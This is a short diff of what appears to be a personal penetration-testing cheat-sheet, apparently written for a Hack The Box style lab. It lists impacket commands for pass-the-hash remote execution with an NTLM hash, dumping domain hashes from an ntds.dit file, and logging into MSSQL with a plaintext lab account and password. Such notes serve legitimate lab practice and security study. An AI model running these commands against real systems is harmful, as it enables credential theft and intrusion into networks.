@@ -14,3 +14,7 @@ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:d4bf5a8658af50fd1d5b8db
 
 #retrieve domain user hashes from ntds.dit file
 impacket-secretsdump -ntds Active\ Directory/ntds.dit -system registry/SYSTEM LOCAL
+
+
+#Others
+/usr/share/doc/python3-impacket/examples/mssqlclient.py  ARCHETYPE/sql_svc:M3g4c0rp123@10.129.255.88  -windows-auth
